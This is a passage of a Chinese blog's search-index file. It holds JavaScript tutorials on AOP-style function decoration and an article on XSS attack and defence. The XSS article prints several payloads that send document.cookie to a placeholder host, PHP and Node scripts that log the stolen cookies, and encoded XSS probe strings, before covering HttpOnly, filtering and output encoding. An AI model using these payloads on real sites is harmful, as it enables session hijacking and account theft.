class="params"></span>)</span>&#123;</span><br><span class="line">    formSubmit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到这里，校验输入和提交表单的代码就完全分离开来，它们不在存在耦合关系，如同把校验规则动态接在formSubmit函数之前，validata成了一个即插即用的函数，它甚至可以写成配置文件的形式，非常有利于分开维护这两个函数。</p><p>但是慢慢的小T也发现了用AOP装饰函数的一些缺点：因为函数通过Function.prototype.before和Function.prototype.after被装饰之后，返回的实际是一个新的函数，如果在原函数上保存了一些属性，那么这些属性会丢失：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> func = <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func.a = <span class="string">'a'</span>;</span><br><span class="line"></span><br><span class="line">func = func.after(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(<span class="number">2</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">alert(func.a); <span class="comment">//输出undefined</span></span><br></pre></td></tr></table></figure><p>除此之外，用AOP装饰方式也叠加了函数的作用域，如果装饰的链条过长，性能上也会受到一定的影响。</p><h1 id="金风玉露一相逢"><a href="#金风玉露一相逢" class="headerlink" title="金风玉露一相逢"></a>金风玉露一相逢</h1><p>小T终于完成了用AOP装饰函数的学习旅程，短短三天，小T与AOP从素未谋面到彼此熟悉，最后相熟相知，小T终于可以用AOP融会贯通的处理日常一些分离代码功能提高代码复用性的任务。渐渐的小T也了解到了用AOP装饰函数方式的缺点，更加游刃有余的结合实际开发进行运用</p><p><strong>人物与故事纯属虚构</strong></p><h2 id="特别鸣谢"><a href="#特别鸣谢" class="headerlink" title="特别鸣谢"></a>特别鸣谢</h2><p>《JavaScript设计模式与开发实践》 -  AlloyTeam曾探</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 设计模式 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> 设计模式 </tag>
            
            <tag> AOP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用AOP装饰函数-摸索篇</title>
      <link href="/2018/10/18/js-higherOrderFn-DecoratorPatternToAOP1/"/>
      <url>/2018/10/18/js-higherOrderFn-DecoratorPatternToAOP1/</url>
      
        <content type="html"><![CDATA[<h1 id="开始：小荷才露尖尖角"><a href="#开始：小荷才露尖尖角" class="headerlink" title="开始：小荷才露尖尖角"></a>开始：小荷才露尖尖角</h1><p>有一天，老大见程序员小T的核心逻辑代码相当冗杂，核心逻辑模块和一些无关的功能融成一团，就告诉小T，让他尝试把日志统计，异常处理模块从和核心逻辑模块中抽离出来，对于刚入职经验不足的小T来说，犹如晴天霹雳。小T前思后想，还好大学期间读了不少编程相关的书籍有些功底，既然目的是想把一些日志统计、异常处理这些和核心逻辑代码无关的抽离出来，他灵机一闪，心想这不是面向切面编程(AOP)嘛，老大果然是老司机，把和核心逻辑模块无关的功能抽离出来，业务逻辑模块就清晰了很多，还能够复用日志统计、日常处理等这些功能模块，真是两全其美啊！</p><a id="more"></a><h1 id="发展：闲敲棋子落灯花"><a href="#发展：闲敲棋子落灯花" class="headerlink" title="发展：闲敲棋子落灯花"></a>发展：闲敲棋子落灯花</h1><p>于是小T开始了实现AOP之旅，心想核心业务模块和其他模块，那我就抽象成两个函数，既然需要在核心业务模块中使用异常处理这些功能，我应该把异常处理函数动态织入到其中，想到这小T不禁欣喜了一番，但是马上又陷入了思考，我应该怎么把一个函数”动态织入”到另一个函数中呢？小T之前对于原型的掌握相当扎实，于是他想我可不可以扩展Function的原型来把一个函数”动态织入”另一个函数呢.小T决定试一下，于是便敲敲打打：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.before = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>小T很快有了一个比较清晰的规划，我需要一个原函数（核心逻辑模块）和新函数（日志统计），我可以把”动态织入”的新函数作为参数传递，然后返回原函数和新函数的”代理”函数，然后执行，这样我不就可以在原函数之前执行新函数啦。既然Function.prototype.before里有原函数又有传递的新函数参数，新函数被执行后this的指向可能会被劫持，所以他想到了先保存一下原函数引用</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.before = fcuntion(beforefn)&#123;</span><br><span class="line">    <span class="keyword">let</span> _self = <span class="keyword">this</span>;  <span class="comment">//保存原函数的引用</span></span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;  <span class="comment">//返回包含了原函数和新函数的”代理“函数</span></span><br><span class="line">       </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后小T想，既然是before要让新函数在原函数之前执行，return function(){}我应该怎么处理可以让两个函数执行并且不会导致this被劫持呢，小T说如果我直接执行beforefn()，那么this指向会被劫持，小T想到apply/call可以很自然的控制/重写this值，以便定义调用函数时确定this指向哪个对象，决定用apply试试：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.before = fcuntion(beforefn)&#123;</span><br><span class="line">    <span class="keyword">let</span> _self = <span class="keyword">this</span>;  </span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        beforefn.apply(<span class="keyword">this</span>,<span class="built_in">arguments</span>); <span class="comment">// 执行新函数，且保证this不被劫持，新函数接受的参数会被原封不会的传入原函数，新函数在原函数之前执行</span></span><br><span class="line">        <span class="keyword">return</span> _self.apply(<span class="keyword">this</span>,<span class="built_in">arguments</span>) <span class="comment">//执行原函数并返回原函数执行结果，并保证this不被劫持</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样就能在函数之前动态的增加功能了，写到这里，小T有些激动，心血来潮决定用同样的方法在函数后也增加功能，但是小T按照上面的方式导致了一系列问题，小T前思后想有些着急了，既然是在函数后增加新功能，让参数函数afterfn先执行显然是不正确的了，于是小T决定这样做：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.after = <span class="function"><span class="keyword">function</span>(<span class="params">afterfn</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> _self = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> ret = _self.apply(<span class="keyword">this</span>,<span class="built_in">arguments</span>);</span><br><span class="line">        afterfn.apply(<span class="keyword">this</span>,<span class="built_in">arguments</span>);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="高潮：漫卷诗书喜欲狂"><a href="#高潮：漫卷诗书喜欲狂" class="headerlink" title="高潮：漫卷诗书喜欲狂"></a>高潮：漫卷诗书喜欲狂</h1><p>终于下班啦，晚上回到家小T躺在沙发上敲着mac回想起以前经常需要在不修改源代码的情况下给函数增加新功能，他常规的做法会先预保存原引用，比如：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;!-- 同事之前代码 --&gt;</span><br><span class="line"><span class="keyword">let</span> a = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&lt;!-- 小T需要给a增加新功能 --&gt;</span><br><span class="line"><span class="keyword">let</span> _a = a;</span><br><span class="line">a = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    _a();</span><br><span class="line">    alert(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line">a();</span><br></pre></td></tr></table></figure><p>但是老大之前曾经告诉他，这虽然是一种符合开-闭原则常规的做法，但是因为总是需要维护_a()函数也许你会经常遇到_a()装饰链较长，装饰函数变多，中间变量数量也会越来越多，有时候还会遇到this被劫持。比如</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> _getElementById = <span class="built_in">document</span>.getElementById;</span><br><span class="line"><span class="built_in">document</span>.getElementById = <span class="function"><span class="keyword">function</span>(<span class="params"> id </span>)</span>&#123;</span><br><span class="line">    alert (<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> _getElementById( id ); <span class="comment">//Uncaught TypeError: Illegal invocation</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> button = <span class="built_in">document</span>.getElementById( <span class="string">'button'</span> );</span><br></pre></td></tr></table></figure><blockquote><p>在alert(1)弹出之后，控制台很明显的报了Uncaught TypeError: Illegal invocation的错误，异常就发生在_getElementById(id)这句话上，因为_getElementById是一个全局函数，this是指向window的，而document.getElementById的内部实现需要使用this引用，this在这个方法内的预期是指向document，而不是window，所以就产生了这样的错误。</p></blockquote><p>所以就需要手动把document当作上下文this传入_getElementById，常用的就是使用<code>call/apply</code>来改变this的指向，老大曾还直言不讳的告诉小T，对call/apply的掌握程度是可能间接性决定了你对JavaScript的精通度，于是小T便对call/apply针对性的理解练习和实践:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> _getElementById = <span class="built_in">document</span>.getElementById;</span><br><span class="line"><span class="built_in">document</span>.getElementById = <span class="function"><span class="keyword">function</span>(<span class="params">id</span>)</span>&#123;</span><br><span class="line">    alert(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> _getElementById.apply(<span class="built_in">document</span>,<span class="built_in">arguments</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> button = <span class="built_in">document</span>.getElementById(<span class="string">'button'</span>);</span><br></pre></td></tr></table></figure><p>但是这样的做法有些不方便，用AOP装饰函数可以很方便的解决这个问题，</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.before = <span class="function"><span class="keyword">function</span>(<span class="params">beforefn</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> _self = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        beforefn.apply(<span class="keyword">this</span>,<span class="built_in">arguments</span>);</span><br><span class="line">        <span class="keyword">return</span> _self.apply(<span class="keyword">this</span>,<span class="built_in">arguments</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.getElementById = <span class="built_in">document</span>.getElementById.before(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(<span class="number">1</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> button = <span class="built_in">document</span>.getElementById(<span class="string">'button'</span>);</span><br></pre></td></tr></table></figure><p>在试一个简单的栗子，利用<code>Function.prototype.after</code>来增加新的window.onload事件：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;!-- 同事之前代码 --&gt;</span><br><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&lt;!-- 需要新增加 --&gt;</span><br><span class="line"><span class="built_in">window</span>.onload = (<span class="built_in">window</span>.onload || <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;).after(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(<span class="number">2</span>);</span><br><span class="line">&#125;).after(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(<span class="number">3</span>);</span><br><span class="line">&#125;).after(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(<span class="number">4</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>就这样敲着敲着，窗外的夜变得寂静些许，只听到小Tcode code的键盘击打声，他抬头看了看墙上的钟表已经凌晨一点了，望了望窗外，月光洒在窗台，小T终于摸清楚了用AOP装饰函数的意图，但是小T有些不满足，因为在Function.prototype上添加before和after方法，是一种污染原型的方法，小T有些排斥，决定把新函数和原函数都作为参数传入before和after方法：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> before = <span class="function"><span class="keyword">function</span>(<span class="params">fn,beforefn</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        beforefn.apply(<span class="keyword">this</span>,<span class="built_in">arguments</span>);</span><br><span class="line">        <span class="keyword">return</span> fn.apply(<span class="keyword">this</span>,<span class="built_in">arguments</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = before(</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;alert(<span class="number">3</span>)&#125;,</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;alert(<span class="number">2</span>)&#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">a = before(a,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;alert(<span class="number">1</span>);&#125;);  <span class="comment">//需要在a()之前增加新方法</span></span><br><span class="line">a();</span><br></pre></td></tr></table></figure><p>窗外的夜更深了，小T按下了关机键，还来不及摸到卧室，就已经慢慢的在沙发上闭上了眼睛，就这样伴随着墙上钟表滴答声，小T进入了梦乡。第二天睡眼惺忪的他揉了揉眼睛，开始了又一天的新生活…</p><p><strong>人物与故事纯属虚构</strong></p><h2 id="特别鸣谢"><a href="#特别鸣谢" class="headerlink" title="特别鸣谢"></a>特别鸣谢</h2><p>《JavaScript设计模式与开发实践》 -  AlloyTeam曾探</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 设计模式 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> 设计模式 </tag>
            
            <tag> AOP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全-浅谈xss攻防（二）</title>
      <link href="/2018/10/10/xss-attack-defense02-md/"/>
      <url>/2018/10/10/xss-attack-defense02-md/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>上次介绍了什么是XSS以及XSS的三种类型，作为上次小尾巴的总结来说：XSS跨站脚本是一种经常出现在web应用程序中的计算机安全漏洞，是由于web应用程序对于用户的输入过滤不足引起的。攻击者利用网站漏洞把恶意脚本代码注入到网页之中，当其他用户浏览这些网页时，就会执行其中的恶意代码，轻者能达到恶作剧的目的，重者可以对受害者采取cookie资料窃取，会话劫持，钓鱼欺骗等各种攻击；分为三种类型，服务端的存储型和反射性，客户端自身漏洞引起的DOM型。这次我简单总结一些常见的攻击对应的防御措施，方便以后学习回顾;</p><a id="more"></a><h1 id="1-Cookie劫持"><a href="#1-Cookie劫持" class="headerlink" title="1.Cookie劫持"></a>1.Cookie劫持</h1><p>下面是几种是窃取用户Cookie信息的恶意代码，攻击者向漏洞页面写入类似的恶意代码从而达到获取客户端cookie信息的目的:</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.location=<span class="string">"http://test.com/cookie.asp?cookie ='+document.cookie</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://test.com/cookie.asp?cookie ='+document.cookie"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript"><span class="keyword">new</span> Image().src=<span class="string">"http://test.com/cookie.asp?cookie ='+document.cookie"</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">img=<span class="keyword">new</span> Image();img.src=<span class="string">"http://test.com/cookie.asp?cookie ='+document.cookie"</span>;img.wdith=<span class="number">0</span>;img.height=<span class="number">0</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml">document.write('<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://test.com/cookie.asp?cookie ='+document.cookie"</span> <span class="attr">width</span>=<span class="string">0</span> <span class="attr">height</span>=<span class="string">0</span> <span class="attr">border</span>=<span class="string">0</span>&gt;</span>')</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>诸如此类，一旦注入成功，这些恶意代码都会向某个特定的远程服务器提交cookie，攻击者会在远程服务器上写一个接收和记录cookie信息的文件<br>例如php版本：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $cookie=$_GET[<span class="string">'cookie'</span>];</span><br><span class="line">    $log= fopen(<span class="string">"cookie.txt"</span>,<span class="string">"a"</span>);</span><br><span class="line">    fwrite($log,$cookie .<span class="string">"\n"</span>);</span><br><span class="line">    fclose($log);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>或者node来处理:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"></span><br><span class="line">http.createServer(<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> Cookies = &#123;&#125;;</span><br><span class="line">    </span><br><span class="line">    req.headers.cookie &amp;&amp; req.headers.cookie.split(<span class="string">';'</span>).foEach(<span class="function"><span class="keyword">function</span>(<span class="params">Cookies</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> parts = Cookie.split(<span class="string">'='</span>);</span><br><span class="line">        Cookies[ parts[ <span class="number">0</span> ].trim() ] = ( parts[ <span class="number">1</span> ] || <span class="string">''</span> ).trim();</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">console</span>.log(Cookies)</span><br><span class="line"></span><br><span class="line">    res.writeHeader(<span class="number">200</span>,&#123;</span><br><span class="line">        <span class="string">'Set-Cookie'</span> : <span class="string">'SSID=EqAc1D; Expires=Wed'</span>, </span><br><span class="line">        <span class="comment">// 注意上面我们不设置HttpOnly;Fix:&gt;&gt;&gt;'SSID=EqAc1D; Expires=Wed;HttpOnly'&lt;&lt;&lt;</span></span><br><span class="line"><span class="string">'Content-Type'</span> : <span class="string">'text/plain'</span></span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    fs.open(<span class="string">'cookie.txt'</span>,<span class="string">'r+'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">err,fd</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(err)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">console</span>.error(err);</span><br><span class="line">        &#125;</span><br><span class="line">        fs.writeFile(fd,Cookies,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(err)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">console</span>.error(err);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;).listen(<span class="number">8000</span>);</span><br></pre></td></tr></table></figure><p>亦或是jsp版本、python flask等等诸如此类可以获取到从客户端发来的cookie做接收和记录操作的。</p><p>获取到存储信息的cookie.txt后，攻击者就可以通过修改网站的cookie信息（f12打开开发者控制工具，application/Cookies）来登入网站，从而来进行进一步的攻击操作。</p><h2 id="防止cookie会话劫持"><a href="#防止cookie会话劫持" class="headerlink" title="防止cookie会话劫持"></a>防止cookie会话劫持</h2><p>根本原因是攻击者获取cookie的恶意js代码注入到站点，进一步传到攻击者的远程服务器，从而进行攻击操作；<br>对于可能的意外注入站点的获取cookie的恶意js代码，我们一般要在设置cookie时加HttpOnly，来禁止意外注入站点的恶意js代码操作Cookie造成xss攻击<br>比如node设置HttpOnly：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">'Set-Cookie'</span> : <span class="string">'SSID=EqAc1D; Expires=Wed ;HttpOnly'</span></span><br></pre></td></tr></table></figure><p>或者php设置HttpOnly：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> ini_set(<span class="string">"session.cookie_httponly"</span>, <span class="number">1</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="2-提高攻击门槛"><a href="#2-提高攻击门槛" class="headerlink" title="2.提高攻击门槛"></a>2.提高攻击门槛</h1><h2 id="使用XSS-Filter"><a href="#使用XSS-Filter" class="headerlink" title="使用XSS Filter"></a>使用XSS Filter</h2><p>针对用户提交的数据进行有效的验证，只接受我们规定的长度或内容的提交，过滤掉其他的输入内容，例如：<br>1.表单数据指定值的类型：年龄只能是 int 、name 只能是字母数字等<br>2.过滤或移除特殊的 html 标签：<code>&lt;script&gt;</code>、<code>&lt;iframe&gt;</code>等<br>3.过滤 js 事件的标签：onclick、onerror、onfocus等<br>4.对于要求用户输入的一些特殊格式的字段，用正则和字段长度进行严格限制，比如手机号，邮箱等<br>如在客户端进行验证手机号的JavaScript代码:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;form id=<span class="string">"test"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"text"</span> id=<span class="string">"tel"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"button"</span> onclick=<span class="string">"checkTel()"</span>&gt; </span><br><span class="line">&lt;<span class="regexp">/form&gt;</span></span><br><span class="line"><span class="regexp">&lt;script&gt;</span></span><br><span class="line"><span class="regexp">    function()&#123;</span></span><br><span class="line"><span class="regexp">        let re = /</span>^<span class="number">020</span>-\d&#123;<span class="number">8</span>&#125;$/;</span><br><span class="line">        <span class="keyword">if</span>(re.test(<span class="built_in">document</span>.getElementById(<span class="string">"Tel"</span>).value))&#123;</span><br><span class="line">            alert(<span class="string">'电话号码格式正确'</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            alert(<span class="string">'错误的电话号码'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>这段JavaScript验证代码要求用户输入的必须是020-开头，后跟8位数字.</p><blockquote><p>但是需要特别注意的是，<em>仅仅在客户端进行非法输入的验证和检测是远远不够的</em>，因为客户端组件和用户输入不在服务器的控制范围内，用户能够完全控制客户端及提交的数据，比如firebug、TemperDate之类的工具，拦截应用程序收到和发布每一个HTTP/HTTPS请求和响应，对其进行修改和检查，从而绕过客户端的检验将信息提交到服务器中。因此，确认客户端生成数据的唯一安全方法就是在服务端实施保护措施。</p></blockquote><h2 id="输出编码Xss-Escape"><a href="#输出编码Xss-Escape" class="headerlink" title="输出编码Xss Escape"></a>输出编码Xss Escape</h2><p>有时候我们又不可避免的需要用户输入一些特殊字符，但是我们又不确定用户输入的这段含特殊字符的数据是不是恶意的含xss的字符，为了保证用户输入的完整性和正确性，就可以使用编码（HTMLEncode）进行处理。</p><p>HTML编码在防止xss攻击上能起很大的作用，它主要使用对应的实体代替HTML字符，让该字符作为其HTML文档的内容而非结构加以处理。</p><table><thead><tr><th align="center">显示</th><th align="center">实体名字</th><th align="center">实体编号</th></tr></thead><tbody><tr><td align="center"><code>&lt;</code></td><td align="center"><code>&amp;lt;</code></td><td align="center"><code>&amp;#60;</code></td></tr><tr><td align="center"><code>&gt;</code></td><td align="center"><code>&amp;gt;</code></td><td align="center"><code>&amp;#62;</code></td></tr><tr><td align="center"><code>&amp;</code></td><td align="center"><code>&amp;amp;</code></td><td align="center"><code>&amp;#38;</code></td></tr><tr><td align="center"><code>&quot;</code></td><td align="center"><code>&amp;quot;</code></td><td align="center"><code>&amp;#34;</code></td></tr></tbody></table><p>上面就是几个可能触发xss的敏感字符，都是一些特殊的HTML字符。都这些字符实现编码和转义后，能够有效地防范HTML注入和XSS攻击</p><p>例如php的<code>htmlspecialchars()</code>库函数，就能够将用户输入的特殊字符进行实体转换：</p><ul><li><code>&lt;</code> 转成 <code>&amp;lt;</code></li><li><code>&gt;</code> 转成 <code>&amp;gt;</code></li><li><code>&amp;</code> 转成 <code>&amp;amp;</code></li><li><code>&quot;</code> 转成 <code>&amp;quot;</code></li><li><code>&#39;</code> 转成 <code>&amp;#39;</code></li></ul><p>实际情况中，我们可以结合这两种情况进行过滤<br><img src="/assets/images/xss-encode02.png" alt="安全的过滤形式"></p><h1 id="3-Xss漏洞检测Poc"><a href="#3-Xss漏洞检测Poc" class="headerlink" title="3.Xss漏洞检测Poc"></a>3.Xss漏洞检测Poc</h1><p>标准的xss漏洞检测代码</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">'xss'</span>)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>img 图片标记属性跨站攻击代码</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">"javascript:alert(/xss/)"</span>&gt;&lt;/img&gt; &lt;img <span class="attribute">dynsrc</span>=<span class="string">"javascript:alert('xss')"</span>&gt;</span><br></pre></td></tr></table></figure><p>无需 “&lt;&gt;”，利用 html 标记事件属性跨站</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">""</span> <span class="attribute">onerror</span>=alert("xss")&gt;</span><br></pre></td></tr></table></figure><p>空格与回车符转换</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">"Jav&amp;#x09;ascript:alert('xss')"</span>&gt; &lt;img <span class="attribute">src</span>=<span class="string">"Jav&amp;#x0A;ascript:alert('xss')"</span>&gt; &lt;img <span class="attribute">src</span>=<span class="string">"Jav&amp;#x0D;ascript:alert('xss')"</span>&gt;</span><br></pre></td></tr></table></figure><p>10 进制转换</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">"&amp;#74&amp;#97&amp;#118&amp;#97&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#58&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#39&amp;#120&amp;#115&amp;#115&amp;#39&amp;#41"</span>&gt;</span><br></pre></td></tr></table></figure><p>以上代码都可以做 Poc 使用，在有变量的位置插入，如果成功执行则代表有漏洞。<br>只要你提交的Poc，服务端原封不动的返回了，说明服务端不经过任何处理就显示了，就证明有漏洞存在。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://book.douban.com/subject/25711796/" target="_blank" rel="noopener">《XSS跨站脚本剖析与防御》–邱永华</a><br><a href="https://book.douban.com/subject/10546925/" target="_blank" rel="noopener">《白帽子讲web安全》–吴翰清</a><br><a href="https://blog.csdn.net/gitchat/article/details/78726803" target="_blank" rel="noopener">《Web 安全：前端攻击 XSS 深入解析》</a></p>]]></content>
      
      
      <categories>
          
          <category> WEB安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全-浅谈xss攻防（一）</title>
      <link href="/2018/10/09/xss-attack-defense-md/"/>
      <url>/2018/10/09/xss-attack-defense-md/</url>
      
